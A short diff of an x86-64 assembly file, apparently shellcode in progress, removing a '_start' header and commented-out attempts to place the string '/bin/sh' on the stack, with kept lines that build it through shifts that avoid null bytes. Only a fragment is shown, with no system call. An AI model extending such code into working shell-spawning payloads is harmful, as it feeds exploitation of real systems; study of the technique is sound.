@@ -1,18 +1,4 @@
-	.global _start
-	.text
-_start:
-	movq $0xaabbccdd, %rbx
-
-	# get string "/bin/sh" in stack
-	# movl $0x68732f, %eax   		# half string
-	# movq $1073741824, %rbx 		# 2^30
-	# mulq %rbx
-	# movq $4, %rbx				# 2^2
-	# mulq %rbx
-	# orq $0x6e69622f, %rax
-	# pushq %rax
-
-	# /bin/sh thik ache
+ thik ache
 	movl $0xff68732f, %eax # half string
 	shlq $40, %rax
 	shrq $8, %rax
